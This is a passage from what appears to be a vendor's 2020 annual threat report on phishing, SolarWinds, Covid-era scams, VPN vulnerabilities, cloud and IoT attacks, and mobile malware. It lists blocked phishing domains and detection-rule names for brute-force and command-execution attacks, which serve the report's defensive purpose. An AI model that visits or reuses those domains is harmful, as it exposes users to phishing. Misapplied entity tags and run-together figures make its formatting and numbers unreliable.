requireonly basic knowledge on how forms are made and little time to set up . While this means that pagesmade with form builders typically look amateurish in comparison with fake domains that are painstakinglybuilt from scratch , it also means that even inexperienced would - be cybercriminals can effortlessly createand use them for phishing schemes . Fortunately , most organizations do not use forms for importantprocesses such as password updates or email verification , so it should be relatively easy for potentialvictims to spot form - based phishing scams . Figure [CARDINAL] 8 . Examples of an email credential phishing form ( left ) and a fake [PERSON] Adobe login page made from a form ( right)Comparing the year - on - year numbers in our phishing data , we observed an interesting change . While thenumber of blocked non - unique phishing URLs decreased , the number of blocked unique phishing [ORG] URLsincreased . [CARDINAL] One possible reason for this is that malicious actors had become less reliant on recyclingphishing URLs for their campaigns and more intent on tailoring URLs based on their targets.11 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report12,861,649Unique 13,845,134194,458,535Non - unique161,722,2102019 20200200MFigure 9 . Blocked unique phishing URLs increased while blocked non - unique ones decreased : A comparison of the numbers of blocked unique phishing URLs ( e.g. , [CARDINAL] three instances of blocked access to the same URL on the same machine counted as [CARDINAL] one attempt ) and the numbers of blocked non - unique phishing URLs ( e.g. , [CARDINAL] three instances ofblocked access to the same URL on the same machine counted as [CARDINAL] three attempts ) in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro Smart Protection Network infrastructureWe also observed a 38 % decrease from [DATE] 2019 [DATE] to [DATE] 2020 in blocked phishing URLs that spoofed Microsoft365 ( formerly Office 365 ) , [CARDINAL] one of the most widely used productivity software suites in the world , whichincludes the popular email application Outlook . However , this should not be taken as a sign that maliciousactors had dialed down their attacks ; it is possible that they had expanded their repertoire with the rise inusage of other essential work tools such as communication apps.150K131,7570201981,2212020Figure [CARDINAL] 10 . The number of blocked unique phishing URLs that spoofed [ORG] Microsoft 365 ( including Outlook ) decreased accounting for [CARDINAL] more [CARDINAL] than [CARDINAL] 27 [CARDINAL] million non - unique access attempts : The [CARDINAL] 10 phishing URLs with the most blocked non - unique access attempts ( e.g. , [CARDINAL] three instances of blocked access to the same URL on the same machinecounted as [CARDINAL] three attempts ) in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureURLCountwww.vrspacely.comapc994.compeachtrackercn.comclk.apxadtracking.netp01.notifa.infoapi.dot - metrix.comqwertyamerica.comapi.bdisl.comsw.wpu.shd11yldzmag5yn.cloudfront.net241,022217,267214,550167,951119,762119,148116,230116,201101,12197,498Table [ORG] 2 . On a per - unique - machine basis , there were [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of attempts to access the top phishing domains : The [CARDINAL] 10 phishing URLs with the most blocked unique access attempts ( e.g. , [CARDINAL] three instances of blockedaccess to the same URL on the same machine counted as [CARDINAL] one attempt ) in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure13 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] ReportThreat [ORG] Actors [ORG] Continue to Compromise Organizations via Supply ChainsWhile it is difficult for threat actors to directly attack organizations with strong security systems in place \u2014 for example , government entities that house extremely sensitive data \u2014 they could circumvent thesedefenses by indirectly compromising the less secure portions of the organizations \u2019 supply chains . In essence , a supply - chain attack takes advantage of the trust model between an organization and itssuppliers to allow an attacker to gain a foothold into the target \u2019s system . This makes it difficult to counteror even detect . Not only do organizations implicitly assume that the products and services offered by theirpartners are safe to interact and conduct business with , but they also often have no way to actively checkfor threats lurking in their supply chains beyond what they can see in their own systems . Supply - chain attacks had become so notorious that in [DATE] February [DATE] 2020 , the [ORG] FBI issued a security alertconcerning them . In particular , the alert warned of supply - chain attacks being launched by threat actorson software companies in order to obtain access to their strategic partners , including organizationssupporting industrial control systems in the energy industry.30 These were done via [GPE] Kwampirs , a [ORG] RAT thatwas used to gain entry to the victims \u2019 machines and networks , after which follow - up activities could beperformed , such as delivering additional components or payloads.31One of the most highly publicized supply - chain attacks in [DATE] recent [DATE] years was the attack involving [ORG] SolarWinds . In [DATE] December , reports began circulating about a sophisticated attack targeting several organizations , including [GPE] US government agencies , via a compromised update of Orion , [ORG] SolarWinds \u2019 widely usednetwork management system software.32 Given the nature of some of the targets , the attack could havefar - reaching consequences . According to the information provided by the company , the malicious actors behind the attack inserted avulnerability into certain [ORG] Orion software builds that could allow attackers to compromise servers runningOrion.33 This meant that once the relevant update was pushed to customers , the attackers were able todeploy a powerful backdoor , known as Sunburst , on the affected machines . Once implanted into thesystems , Sunburst gave the attackers complete access to the affected networks . The attackers couldthen issue commands to gather system information , write and delete files , create and delete registry keys , and disable analysis tools , among other malicious activities . A [ORDINAL] second - stage payload , a backdoor knownas [PRODUCT] Supernova , was also part of the attack . The attackers used [PRODUCT] Supernova to inspect and respond to [NORP] HTTPrequests via appropriate HTTP query strings , HTML form values , and cookies , and to execute web shellcommands through a specific HTTP request format.3414 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] ReportCovid-19 and [ORG] Remote [ORG] Work [ORG] Cause Major Shifts in [ORG] Cybersecurity [ORG] Malicious [ORG] Actors [ORG] Take [ORG] Advantage [ORG] of [ORG] Global [ORG] Pandemic [ORG] and [ORG] Other [ORG] Significant [ORG] EventsMalicious actors notably capitalized on the [DATE] 2020 [GPE] US elections , specifically the presidential election , toprey on people \u2019s desires to get involved by setting up election - related scams.35 And it was not just run - of - the - mill cybercriminals who were active during the runup to the elections either . Even several majoradvanced persistent threat ( [ORG] APT ) groups were reported to have been participating in campaigns targetingindividuals and groups associated with major presidential candidates and with general political andadvocacy groups.36Of course , it would be difficult , if not impossible , to talk about cybersecurity in [DATE] 2020 without discussinghow it was affected by the global Covid-19 pandemic . As we covered in our [DATE] 2020 [DATE] midyear cybersecurityreport , malicious actors began taking advantage of the situation to hatch up a slew of Covid-19 - themedthreats.37In [DATE] 2020 , we detected [CARDINAL] more [CARDINAL] than [CARDINAL] 16 [CARDINAL] million Covid-19 - related threats , consisting of malicious URLs , spam , and malware . [PERCENT] Nearly 90 % of these detections were malicious spam , indicating that spam emails werethe preferred avenue for malicious actors , likely because of their accessibility and simplicity relative tomalicious URLs and malware , which require some technical knowledge and planning . The bulk of thesedetections came from the [GPE] US , [GPE] Germany , and [GPE] France , which were also among the countries that had beenhit hardest by the pandemic.15 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report0.2 % [DATE] SpamTOTAL16,393,564Figure [DATE] 11 . [PERCENT] Nearly 90 % of detections of Covid-19 - related threats were malicious spam : The distribution of detections of Covid-19 - related threats in [DATE] 2020 by typeSource : Trend Micro Smart Protection Network infrastructure29.0 % USTOTAL16,393,5649.2 % France14.6 % GermanyFigure 12 . The bulk of detections of Covid-19 - related threats came from the [GPE] US , [GPE] Germany , and [GPE] France : The distribution of detections of Covid-19 - related threats in [DATE] 2020 by countrySource : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year , Covid-19 - based threats focused on either causing alarm to recipients orallegedly providing information about the pandemic . For instance , many of the early spam emailsdiscussed symptoms of the viral disease.38The scammers behind these threats tailored their techniques to whatever new and current informationwas available . For example , with the benefits of the original Covid-19 stimulus package provided by the16 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportUS government nearing its expiry date,39 malicious actors took advantage of the time - bound situationby sending text messages to potential victims stating that they had received a certain amount as part ofthe package . Included in the text was a link to a phishing page designed to steal personal and financialinformation.40Another major development was the initial rollout of Covid-19 vaccines from different drug companies inthe second [DATE] half [DATE] of [DATE] the [DATE] year . As expected , cybercriminals promptly followed suit with their own doses ofvaccine - related scams . Some offered fake vaccines for varying amounts , even setting up domains ( someof which included malware ) to fool their victims.41 Other scammers resorted to phishing emails , sent notjust to the general populace but also to people involved in the vaccine supply chain.42Unsurprisingly , business email compromise ( [ORG] BEC ) scammers also banked on the pandemic , as Covid-19 - related subject lines made up the highest number among the [ORG] BEC samples we detected . Many ofthe subject lines were vague , with some even referring to unrelated topics such as invoice or paymentrequests . However , even these emails found a way to use the terms \u201c Covid \u201d or \u201c Covid-19 , \u201d likely as a wayto garner their victims \u2019 attention . \u201cRe : COVID-19\u201d\u201cRe : Covid-19 update\u201d\u201cCOVID-19 QUICK REPLY\u201d\u201cImportant Message on COVID-19\u201d\u201cCOVID-19 Fwd : [DATE] April Invoices\u201d\u201cCOVID-19 Shut down\u201d\u201cCOVID-19 issue\u201d\u201cCOVID-19 Fwd : May [PERSON] Invoices\u201d\u201cFwd : Covid-19 update\u201d\u201cRe : Covid positive donors\u201d\u201cCOVID-19 RESPOND\u201d\u201cCOVID-19 / FluA+B [ORG] Antigen [ORG] Combo [ORG] Rapid [ORG] Test\u201d\u201cCovid [ORG] Task Force\u201dTable 3 . Examples of the subject lines we encountered in [ORG] BEC attempts that referenced Covid-19 in [CARDINAL] 2020Overall , however , the number of [ORG] BEC attempts we detected in [DATE] 2020 decreased by [PERCENT] 17 % year on year from2019.17 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity Report100K88,12173,093020192020Figure [CARDINAL] 13 . While the overall number of [ORG] BEC attempts declined , [ORG] BEC scammers were able to capitalize on theCovid-19 pandemic : A comparison of the numbers of detected [ORG] BEC attempts in [DATE] 2019 and [CARDINAL] 2020Note : Data refers to the number of detected [ORG] BEC attempts , which does not indicate whetherthe attacks were successful . The CEO and the managing director / director continued to be the positions most spoofed by [ORG] BECscammers , accounting for [CARDINAL] more [CARDINAL] than [CARDINAL] half of all spoofed positions . Meanwhile , finance managers anddirectors of finance remained the most targeted ; they were targeted in [CARDINAL] nearly [CARDINAL] a [CARDINAL] third of [ORG] BEC attempts . Professors were the [ORDINAL] third most common target of [ORG] BEC attempts , showing that scams on educationalinstitutions continued to be rampant.25.6 % 17,6078.2 % President10.7 % General manager / Manager24.3 % Managing director/ DirectorFigure 14 . The CEO remained the most spoofed position in [ORG] BEC attempts , closely followed by the managingdirector / director : The distribution of spoofed organizational positions in detected [ORG] BEC attempts in [CARDINAL] 2020Note : Data refers to a sample set of detected [ORG] BEC attempts , which does not indicate if the attacks weresuccessful . BEC attempts consist of CEO fraud.18 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report57.3 % 23,57113.4 % Director of \ufb01nance6.4 % Professor5.1 % Customer service1.5 % [LAW] SalesFigure [LAW] 15 . Finance managers , directors of finance , and professors were the most frequently targeted positions inBEC attempts : The distribution of targeted positions in detected [ORG] BEC attempts in [CARDINAL] 2020Note : Data refers to a sample set of detected [ORG] BEC attempts , which does not indicate if the attacks weresuccessful . BEC attempts consist of CEO fraud . [CARDINAL] One of the hallmarks of [ORG] BEC attacks is that its perpetrators do not need to have a complex infrastructureto pull off successful attacks . Scammers can even use public cloud infrastructure , as we observed in theWater [GPE] Nue BEC campaigns . This series of campaigns , which started in [DATE] March , targeted senior executivesin the [GPE] US and [GPE] Canada to obtain account credentials for further malicious activities . Once compromised , these accounts were used to send fund transfer requests to lower - ranking staff . The fraudsters behindWater [GPE] Nue used legitimate cloud - based email services such as [ORG] SendGrid to deliver their emails . Whilethis might sound like a typical [ORG] BEC attack pattern , with no noteworthy characteristics other than the useof the cloud service , [FAC] the [FAC] Water [FAC] Nue campaigns had collected [CARDINAL] more [CARDINAL] than [CARDINAL] 800 credentials at the time ofour analysis , showing that even seemingly ordinary [ORG] BEC campaigns could still have the potential to dodamage.43We also encountered a new modus operandi in [DATE] 2020 aimed at [NORP] French companies wherein cybercriminalsused fake tax fraud emails \u2014 apparently from the [NORP] French tax system itself \u2014 to gather information abouttheir victims . The [ORG] PDF letter ( built from an actual [ORG] PDF file used by the tax system ) included in the emaillooked quite convincing , while the email address used to send the email was very similar to the officialemail address of the [NORP] French tax system . After obtaining the information they needed , the scammersbehind the scheme would then send bogus emails to their target \u2019s customers requesting banking accountreference changes in favor of an account presumably controlled by the scammers.4419 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportThe BEC scammer sends a fake tax fraud email , which asks for information , to thetarget company . The target company replies with information on its threebiggest customers and \ufb01nancial or accounting department employees . The scammer registers thedomain to be used forimpersonating one of the company \u2019s employees . The scammer uses the domain to send emails asking the company\u2019scustomers to change their banking account references . The victim changes theirbanking accountreferences . Figure [CARDINAL] 16 . The method used by [ORG] BEC scammers in the [NORP] French BEC campaign in 2020Remote Work Presents Challenges for [ORG] OrganizationsThe pandemic forced a shift away from the traditional office structure toward a work - from - home ( WFH)setup for a large number of organizations . While it provided certain benefits for organizations andemployees alike , such as less expense on infrastructure and reduced costs for travel , remote work wasnot without its own set of challenges , especially from a cybersecurity perspective . While some organizations might have already had some form of remote work option in place for employeesbefore the pandemic , migrating the majority of workers to the same setup meant having to stress - testcritical systems to ensure that they would operate effectively even under heavy [ORG] loads.45 Furthermore , organizations also had to ensure that their employees were provided all the support and training theyneeded to work effectively from home . There was also a need to look beyond infrastructure . To help closesecurity gaps , enterprises needed to introduce or reinforce policies that focused on security and thatwould help remote workers secure their own home workspace . To that end , virtual private networks ( VPNs ) became indispensable tools for organizations in protectingnetwork connections from external threats . In fact , bolstered by the [ORG] WFH arrangements implemented byorganizations around the world , usage of VPNs reached an all - time high in 2020.4620 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportIt is important to note , however , that VPNs are not the be - all and end - all of security technology . They canbe and are abused by malicious actors for cyberattacks . Like any software , [ORG] VPN solutions could alsobe host to various vulnerabilities , which , if exploited , could provide attackers ways to compromise theirtargets \u2019 systems . [CARDINAL] One of the most notable and widespread VPN vulnerabilities is CVE-2019 - [DATE] 11510 , a critical arbitrary filedisclosure flaw in the [ORG] VPN product Pulse Connect Secure that could allow remote attackers to obtainusernames and plain - text passwords from affected machines.47 Despite being relatively new , CVE-2019 - [DATE] 11510 already accounted for [CARDINAL] nearly [CARDINAL] 800,000 detections in [DATE] 2020 alone . It had already been involved inactual attacks , including ones in [DATE] 2020 where it was exploited to deliver the [GPE] Sodinokibi ransomware.48CVE-2019 - [DATE] 11539 CVE-2019 - [DATE] 11510 CVE-2018 - 13379FortinetPulse SecureCVE-2018 - 13379CVE-2019 - 11510CVE-2019 - 11539Citrix Systems CVE-2019 - 19781100K88,51563,83162,93160,85157,54366,17668,94269,90568,24880,89763,34773,65772,84344,17239,03244,71740,11725,05315,8349,86418,31214,91020,89727,1101,1437113602,7042,9282,7883,4782,7562,980749 73770 571,149JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure [CARDINAL] 17 . The detections for CVE-2018 - 13379 rose sharply in [DATE] the [DATE] fourth [DATE] quarter , while the opposite occurred for CVE-2019 - 19781 ; detections for the Pulse Secure vulnerability CVE-2019 - [DATE] 11510 remained fairly consistent on aper - [DATE] month basis : A [DATE] monthly comparison of the detection counts of notable VPN vulnerabilities in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Digital [ORG] Vaccine filtersMalicious actors also found other ways to incorporate VPNs in their attacks . In [DATE] September , we publishedour analysis of an instance where an attacker bundled a [ORG] VPN installer with the [PERSON] Bladabindi backdoor , whichcould be used to gather information from infected machines.49 Cases like this show that , in addition toupdating their [ORG] VPN software regularly to ensure that existing vulnerabilities are addressed , [ORG] VPN usersshould be mindful of where they download their software.21 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportThe transition to remote work also led to increased reliance on communication tools such as [PERSON] Zoom , [GPE] Slack , and [ORG] Discord . This , in turn , led to an increase in attacks that targeted or used these applications.50\u201cZoombombing , \u201d in which unwanted users would intrude on ongoing [PERSON] Zoom meetings , was [CARDINAL] one of themore common methods of communication app abuse . And while it could be highly disruptive at times , ultimately most instances of [GPE] Zoombombing amounted to nothing more than harmless , if annoying , pranks . Other types of Zoom - related attacks , though , were more damaging . Some malicious actors resorted tousing [LOC] Zoom installers \u2014 either legitimate ones bundled with malware or malware disguised as installers \u2014 to trick users into installing various payloads on their machines.51Slack and [ORG] Discord were also incorporated by cybercriminals into their attacks . [CARDINAL] One of these involvedCrypren , a ransomware variant that had a unique method of reporting its victims \u2019 encryption status backto the command - and - control ( [ORG] C&C ) server : via [PERSON] Slack webhooks . We also found samples showing howDiscord was used in an email spam campaign that delivered malware to its victims \u2019 machines.5222 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportOrganizations Face Threats in [GPE] Cloud , IoT , and [PERSON] Mobile [PERSON] Environments [PERSON] Cloud [PERSON] Misconfiguration Is Still a Problem for Many OrganizationsIn [DATE] 2020 , the cloud became an even more integral part of the operations of many organizations . Accordingto the [DATE] 2020 Cyber Risk Index , the area of cloud computing infrastructure and providers was ranked asone of the chief areas of concern for organizations.53The cloud has indeed become critical to a properly functioning enterprise , even more so in a remoteworking environment . Cloud - based services offer many benefits to enterprises , especially with regard tocost efficiency , agility , and scalability . However , it would be a mistake to consider the cloud as a turnkeysolution that organizations should not have to worry about in terms of security . Securing the cloud isnot without its own set of challenges.54 [CARDINAL] One aspect of cloud infrastructure that is often overlooked is theproper configuration of cloud assets and services , leading to misconfiguration remaining a major risk incloud environments , as seen in the various incidents in [DATE] 2020 that were primarily caused by misconfiguredcloud software and infrastructure . Traditionally , malicious actors use vulnerability exploitation to execute remote code , a crucial step ingaining a foothold in a target system . However , some of the incidents we observed in the past yearinstead involved attackers looking for open APIs to exploit . In [DATE] April , it was reported that attackers haddropped cryptocurrency miners on misconfigured [PERSON] Docker daemon API ports via the [GPE] Golang - based [ORG] Kinsingmalware . [CARDINAL] One notable characteristic of [GPE] Kinsing is its ability to hide the presence of malicious componentsthrough the use of a rootkit , making its activities even more difficult to detect for affected [DATE] users.55A [DATE] month [DATE] later , we analyzed a bot from the threat actor group TeamTNT that was designed to minecryptocurrency and perform distributed denial - of - service attacks.56 The main target of this bot was , again,23 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] Reportopen [ORG] Docker daemon ports . And toward [DATE] the [DATE] end [DATE] of [DATE] the [DATE] year , we observed more malicious activitiesfrom the group as it evolved its attacks further . Its [DATE] December attack saw the group adding propagationfunctionalities and the ability to steal [ORG] Amazon [ORG] Web [ORG] Services ( AWS ) [PERSON] Secure [PERSON] Shell ( [ORG] SSH ) credentials.57However , none of these attacks would have been possible without some form of misconfiguration orsecurity gap in the infected system . In these cases , the group needed to perform remote code executionon the system by taking advantage of instances of misconfiguration , weak or stolen credentials , orvulnerabilities . In [DATE] October , we also reported on a unique attack on exposed [PERSON] Docker APIs that involved the use of theMetasploit Framework ( MSF ) shellcode as a payload \u2014 the [ORDINAL] first time we observed the use of such atechnique.58 This is notable since a typical attack on exposed [PERSON] Docker APIs involves cryptocurrency miners . Cybercriminals Take Advantage of Underground Cloud InfrastructureIronically , it is not just enterprises that benefited from cloud services in [DATE] 2020 , as we found in our extensiveresearch into how malicious actors used the cloud in [DATE] the [DATE] past [DATE] year . In the cybercriminal underground , malicious actors regularly interact and deal with one another . There areeven cases where cybercriminals work with one another to perform various tasks \u2014 for example , onegroup or individual can be responsible for accessing a victim \u2019s system , while another group provides theC&C infrastructure \u2014 essentially commodifying underground services . There is also an extensive list ofcloud - based services being peddled in the underground . These range from simple dedicated hostingservices to more niche offerings such as mobile workspaces and telecommunication - related services , allof which could help malicious actors with their activities.59In recent times , we have seen a number of attacks where data is stolen by cybercriminals . Often theamount of stolen data is such that individual cybercrime groups are unable to fully use all the informationeven if they want to . As a result , some underground elements have resorted to renting out their \u201c cloudsof logs \u201d to other cybercriminals.60Some of these offerings even have pricing models , depending on the level of access they provide . [ORG] Thedata found in these sets also varies , with the typical contents being personally identifiable information(PII ) , user credentials for various cloud services , and credit card information.24 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportFigure 18 . A dataset being sold in the underground at varying prices , including a US$ 900 \u201c lifetime membership\u201dOne of the primary advantages provided by these types of services is that they give malicious actors theability to process and manage enormous amounts of data without the need to have complex infrastructure . The easy access to this information means that attacks can occur faster and more efficiently . This isespecially useful in targeted attacks , where threat actors could find the information that they need withouthaving to spend substantial time and effort in gathering it . As participants continue to refine and evolve this underground market , we can expect to see organizationsat greater risk from their data being stolen , especially since the use of services sold in this space meansthat the gap between the theft and the actual attack becomes much shorter . Attacks on [ORG] IoT [ORG] Devices [ORG] IncreasedIn addition to the cloud , the [ORG] IoT also played a key role in many organizations \u2019 shift to remote work \u2014 andsure enough , malicious actors also took notice . As we noted in our security predictions for [DATE] 2021 , malicious actors will increasingly focus on home networksas they try to find ways into their targets \u2019 systems.61 Compromised home networks and devices couldserve as launching points for attackers before they jump to other devices with the eventual goal of gainingaccess to the corporate networks the devices are connected to . Routers are particularly vulnerable25 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Reportto remote attacks , especially since the security at an employee \u2019s home is not as robust as that at anenterprise workplace . Based on our detections , inbound attacks possibly occurred on 15.5 % of routers while 5.1 % of routerswere possibly used for outbound attacks in [DATE] 2020.Figure [DATE] 19 . In [DATE] 2020 , 15.5 % of routers were possibly victimized while 5.1 % were possibly compromised . Note : Data is based on the percentages of detected inbound attacks ( routers as victims ) and outbound attacks(routers as attackers).Source : [ORG] Trend [ORG] Micro \u2122 Smart Home Network solutionIn [DATE] the [DATE] past [DATE] year , we also saw an uptick in the total number of inbound attack events , which was morethan triple the [DATE] 2019 tally , and in the total number of outbound attack events , which nearly doubled [GPE] from2019 . Furthermore , the number of internet - connected devices on which we detected possible inboundattacks and the number of those that might have been used for possible outbound attacks both increased . We also saw more routers ( which the internet - connected devices were connected to ) being targeted bypossible inbound attacks or being used for possible outbound [CARDINAL] attacks.26 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity ReportPossible inbound attacksRouters on which possibleinbound attacks weredetectedInternet - connected devices on which possible inboundattacks were detected3B02,878,216,4791.5M1,492,4092.5M1,141,2852,027,6461,561,779929,084,56420192020201920202019202000Figure [CARDINAL] 20 . There was a significant increase in possible inbound attacks , and the numbers of internet - connecteddevices and routers on which possible inbound attacks were detected also increased : A comparison of thedetection counts of possible inbound attacks and affected routers and devices in [DATE] 2019 and [CARDINAL] 2020Note : Events were when rules were triggered for activities or behaviors from malicious , gray , and potentiallyunwanted applications , and were indicators that attacks might happen . Possible attacks were eventsclosely related to threat activity . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Home [ORG] Network solutionOutbound attacksRouters that might have been used for possibleoutbound attacksInternet - connected devices that might have been usedfor possible outbound attacks200M196,012,782250K228,215300K167,498210,289257,62699,266,382000201920202019202020192020Figure [CARDINAL] 21 . There were growths in the number of possible outbound attacks and the numbers of internet - connecteddevices and routers that might have been used for possible outbound : A comparison of the detection counts ofpossible outbound attacks and affected routers and devices in [DATE] 2019 and [CARDINAL] 2020Note : Events were when rules were triggered for activities or behaviors from malicious , gray , and potentiallyunwanted applications , and were indicators that attacks might happen . Possible attacks were eventsclosely related to threat activity . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Home [ORG] Network solution27 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportBrute - force attempts made up a significant portion of the inbound attacks , indicating that user credentialswere attackers \u2019 most preferred target in [CARDINAL] 2020.NETBIOS SMB username brute - force attemptRDP brute - force loginNETBIOS SMB authorization failureSMB [ORG] Microsoft Windows SMB server SMBv1 CVE-2017 - 0147 information disclosure -1WEB remote command execution via shell script -1.hSIP Asterisk PJSIP endpoint presence disclosure ( CVE-2018 - 12227)MALWARE suspicious [NORP] IoT worm Telnet activity -1FILE Android libstagefright mp4 tx3 g [PERSON] Atom multiple buffer over\ufb02ow -1WEB [PERSON] GoAhead login.cgi information disclosure [NORP] vulnerability1,407,789,562618,498,867523,301,68574,352,26446,037,02940,324,77219,928,76518,215,82716,203,529SSH brute - force login13,398,00601.5BFigure 22 . [GPE] Brute - force login attempts were the top [CARDINAL] two inbound attack events : A comparison of the detection counts of the top [CARDINAL] 10 event rules triggered by possible inbound attacks in [CARDINAL] 2020Note : Events were when rules were triggered for activities or behaviors from malicious , gray , and potentiallyunwanted applications , and were indicators that attacks might happen . Possible attacks were eventsclosely related to threat activity . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Home [ORG] Network solutionA similar story can be seen for outbound attacks , where [ORG] NetBIOS [ORG] Server [ORG] Message [ORG] Block ( SMB ) usernamebrute - force attempts accounted for the highest number . [ORG] Microsoft [PRODUCT] Windows [PRODUCT] SMB attacks , includingexploitation of [ORG] WannaCry vulnerabilities , were a close second.28 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportNETBIOS SMB username brute - force attemptMicrosoft Windows SMB server SMBv1 CVE-2017 - 0147 information disclosure vulnerabilitySSH brute - force login attemptNETBIOS SMB authorization failureSMB [ORG] Windows [ORG] SMBv2 information disclosure vulnerability ( CVE-2019 - 0703)RDP brute - force loginWEB remote command execution via shell script -1.hWEB ACME mini_httpd arbitrary \ufb01le read ( CVE-2018 - 18778)MALWARE suspicious [NORP] IoT worm Telnet activity -1FTP brute - force login -2.102173,201,91964,061,1236,464,6825,724,5855,443,8404,758,8244,302,9623,348,9953,143,9282,470,387080MFigure [CARDINAL] 23 . [GPE] Brute - force login attempts were among the most common methods used in outbound attacks : A comparison of the detection counts of the top [CARDINAL] 10 event rules triggered by possible outbound attacks in [CARDINAL] 2020Note : Events were when rules were triggered for activities or behaviors from malicious , gray , and potentiallyunwanted applications , and were indicators that attacks might happen . Possible attacks were eventsclosely related to threat activity . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Home [ORG] Network solutionThere were several noteworthy [ORG] IoT incidents from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year , some of which , such asUrgent/11 and [PERSON] Ripple20 , we had covered in our midyear cybersecurity report.62 In [DATE] the [DATE] second [DATE] half of theyear , researchers from [ORG] Forescout disclosed Amnesia:33 , a set of [CARDINAL] 33 vulnerabilities affecting open - sourceTCP / IP stacks deployed in a large number of [NORP] IoT devices worldwide , including industrial internet - of - things(IIoT ) devices . Exploitation of these vulnerabilities could enable attackers to take control of devices andabuse them for malicious activities such as creating an entry point to get into a network or for lateralmovement.63What makes Amnesia:33 especially troubling is that the affected [ORG] TCP / IP stacks \u2014 which include Nut / Net , FNET , picoTCP , and [ORG] uIP \u2014 are not from a single company . Considering the number of devices from differentcompanies that could be affected , the vulnerabilities could spread at a rapid rate . Furthermore , trackingthe bugs and assessing their impact could prove difficult because of the scope of the vulnerabilities andbecause the potentially affected systems might be highly modular , lack any kind of documentation , or nolonger even be supported.6429 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportVulnerabilities like those found in Amnesia:33 could have significant impact , not just on the users of theaffected devices but also on the supply chain as a whole . It is not difficult to imagine a situation similar tothe [ORG] SolarWinds attack where malicious actors gain access to their target via vulnerable devices from anorganization that is part of the supply chain . As for the more common [ORG] IoT threats , among the most notable were the variants of the [ORG] Mirai botnetmalware , which had been accruing greater infamy since its discovery in [CARDINAL] 2016,65 that we observed [DATE] inthe [DATE] past [DATE] year . In [DATE] July , we reported on our discovery and analysis of a [ORG] Mirai variant that exploited ninevulnerabilities , a mix of old and new , most notably CVE-2020 - 10173 , a multiple authenticated commandinjection vulnerability in [EVENT] Comtrend [EVENT] VR-3033 [EVENT] routers.66 [DATE] Later [DATE] that [DATE] month , we reported on our examination ofanother [ORG] Mirai variant , which exploited CVE-2020 - 5902 , an [CARDINAL] F5 BIG - IP Traffic Management User Interface(TMUI ) remote code execution vulnerability.67Mobile [ORG] Malware [ORG] Becomes [ORG] Stealthier Despite Decrease in Malicious AppsWe saw a 41 % decline in the number of mobile apps that we blocked in [DATE] 2020 , compared to thecorresponding number from [DATE] 2019 . On the other hand , the number of mobile device - related malicioussamples that we detected grew by 67 % from [DATE] the [DATE] previous [DATE] year . [CARDINAL] One possible reason for this discrepancymight be that malicious actors targeted mobile devices ( either directly or indirectly ) via methods that didnot involve their apps , such as phishing pages or social media messages.60M59,984,72335,156,917020192020Figure 24 . There was a 41 % year - on - year decrease in blocked mobile apps , a possible indication that malicious actors did not focus too much on deploying malicious apps [DATE] this [DATE] year : A comparison of the numbers of blockedmalicious [ORG] Android apps in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro Mobile App Reputation Service30 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity Report8M4,721,6407,880,048020192020Figure [DATE] 25 . Despite the decrease in blocked mobile apps , mobile device - related malicious samples saw a 67%year - on - year increase , perhaps because malicious actors employed methods of infecting mobile devicesother than malicious apps : A comparison of the numbers of detected mobile device - related malicious samplesin [DATE] 2019 and 2020Source : Trend Micro Mobile App Reputation ServiceAlthough mobile device attacks were overshadowed by other cybersecurity incidents , there were stillseveral noteworthy mobile threat stories from [DATE] the [DATE] past [DATE] year . In [DATE] November , we examined a new variantof the [PERSON] Joker malware that was contained in a wallpaper app offering HD and 4 K wallpapers . This Jokervariant was notable for incorporating [ORG] GitHub pages and repositories as a method of evading detection.68Instead of its past behavior of using application class and launcher activity , the new variant instead injectscode into a new location . Furthermore , its use of [ORG] GitHub serves a double purpose of facilitating stealthymalicious activity while also housing the payload . What makes this variant particularly nefarious is thatit is contained in a functioning app , which , when combined with the variant \u2019s other obfuscation features , makes it difficult for victims to detect that they have already been infected . We also looked into how [ORG] Android malware obfuscation is evolving via an in - depth analysis of Geost andits multiple layers of obfuscation , noting that the malicious actors behind the malware are continuouslyinvesting in and improving it.69 However , we also noted that the changes found in the code did not yetseem to have much of an impact on the actual quality of the obfuscation and , in turn , on the detectionrate.31 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportA Greater Number of Dangerous More Risky Flaws Are Disclosed Even as [PERSON] Older [PERSON] Bugs Are Still Being Actively ExploitedIn 2020 , the Trend Micro \u2122 Zero Day 